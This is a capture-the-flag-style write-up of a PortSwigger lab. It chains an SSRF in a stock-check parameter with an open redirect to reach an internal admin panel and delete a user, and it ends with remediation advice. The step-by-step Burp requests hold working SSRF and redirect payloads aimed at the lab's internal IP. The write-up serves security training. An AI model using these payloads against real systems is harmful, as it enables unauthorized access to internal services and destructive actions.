# PortSwigger Lab Writeup: SSRF with Filter Bypass via Open Redirection

> **Category:** Server-Side Request Forgery (SSRF)  
> **Difficulty:** Practitioner  
> **Status:** ✅ Solved  
> **Platform:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/ssrf)

---

## 🧪 Lab Summary

This lab has a stock check feature where the `stockApi` parameter is restricted to only access the **local application** (same-origin). A direct SSRF to internal IPs is blocked. However, the application contains an **open redirection vulnerability** in its "Next product" navigation feature. By chaining the SSRF with the open redirect, the restriction is bypassed — reaching the internal admin panel at `http://192.168.0.12:8080/admin` and deleting user `carlos`.

---

## 🎯 Objective

> Access `http://192.168.0.12:8080/admin/delete?username=carlos` by chaining the SSRF vector with an open redirect vulnerability on the same application.

---

## 🔍 Vulnerability Background

### Defense in Place
Unlike a simple SSRF, this lab's `stockApi` parameter enforces an **origin restriction** — it only permits requests to the local application. Any direct attempt to point `stockApi` at an internal IP (e.g. `http://192.168.0.12:8080`) is rejected.

### Open Redirection
An **open redirect** occurs when an application uses user-controlled input as the `Location` header in an HTTP redirect, without validating the destination. In this lab:

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2

HTTP/1.1 302 Found
Location: /product?productId=2
```

The `path` parameter is echoed directly into the `Location` header — meaning any URL supplied here, including `http://192.168.0.12:8080`, becomes the redirect target.

### Why Chaining Works

```
stockApi (allowed: local app) ──► nextProduct?path=<internal-url> ──► 302 ──► internal IP
         ↑                                ↑                                      ↑
   passes filter                 allowed same-origin request            HTTP client follows redirect
```

The stock checker's HTTP client **follows redirects automatically**. Since the first request targets the allowed local application, the filter passes it. The subsequent redirect to the internal IP is never checked.

---

## 🛠 Tools Used

- **Burp Suite** (Intercept + Repeater)
- Web browser
- Manual URL crafting

---

## 📋 Step-by-Step Exploitation

### Step 1 — Intercept the Stock Check Request

Visit any product page, click **"Check stock"**, intercept in Burp Suite, and send to Repeater.

```
POST /product/stock HTTP/1.1
...
stockApi=http%3A%2F%2F<lab-host>%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

---

### Step 2 — Confirm Direct SSRF is Blocked

Change `stockApi` to point directly at the internal admin:

```
stockApi=http://192.168.0.12:8080/admin
```

❌ **Rejected.** The origin filter is in place.

---

### Step 3 — Discover the Open Redirect

Click **"Next product"** on a product page and intercept the request:

```
GET /product/nextProduct?currentProductId=1&path=/product?productId=2

HTTP/1.1 302 Found
Location: /product?productId=2
```

Test with an absolute URL:

```
GET /product/nextProduct?path=http://example.com
```

✅ Returns `302 Location: http://example.com` — **open redirect confirmed**.

---

### Step 4 — Chain: SSRF → Open Redirect → Internal Admin

Set `stockApi` to the open redirect endpoint, passing the internal admin URL as the `path`:

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
```

✅ The stock checker fetches the allowed same-origin path, receives a `302`, follows it to the internal IP, and returns the admin panel content.

---

### Step 5 — Delete User carlos ✅

Amend the `path` to trigger the delete action:

```
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

Send the request. The server follows the redirect chain, executes the delete, and the lab is solved.

---

## 🔗 Attack Flow

| Step | Actor | Action |
|---|---|---|
| 1 | Attacker | Sends `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos` |
| 2 | Stock Checker | Initial URL is same-origin → **passes the origin filter** |
| 3 | App Server | Issues `GET /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos` |
| 4 | nextProduct endpoint | Returns `302 Location: http://192.168.0.12:8080/admin/delete?username=carlos` |
| 5 | Stock Checker | Follows redirect to internal IP — **carlos deleted** ✅ |

---

## 💡 Key Insight

> The filter only checks the **first request URL** — not the final destination after redirect resolution.

The `stockApi` filter sees a relative path pointing to the local app and approves it. By the time the HTTP client reaches the internal service, there is no second validation pass.

---

## 🔐 Remediation

### Fix the Open Redirect
| Issue | Fix |
|---|---|
| `path` parameter echoed into `Location` | Validate against a whitelist of allowed relative paths |
| Absolute URLs accepted in `path` | Reject any value starting with `http://`, `https://`, or `//` |
| User input used as redirect destination | Map `productId` → URL server-side; never echo user input |

### Fix the SSRF
| Issue | Fix |
|---|---|
| HTTP client follows redirects blindly | Disable automatic redirect-following, or re-validate the destination after each redirect |
| No post-redirect validation | Check the final resolved IP against a blocklist of private/internal ranges |
| Network allows internal egress | Block outbound requests to `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` at the firewall |

---

## 🧠 Key Takeaways

1. **Open redirects are not low-severity** — when chained with SSRF, they become critical
2. **Origin-based SSRF filters** are bypassable if any allowed endpoint performs a redirect
3. **Automatic redirect-following** by HTTP clients is a common SSRF amplifier
4. **Defense must cover the final destination**, not just the initial request URL
5. **Vulnerability chaining mindset**: `medium SSRF restriction` + `medium open redirect` = `critical SSRF`

---

## 📚 References

- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [PortSwigger: Open Redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- [PortSwigger: Bypassing SSRF Filters via Open Redirection](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

---

*Writeup by Neelesh Pandey | PortSwigger Web Security Academy*
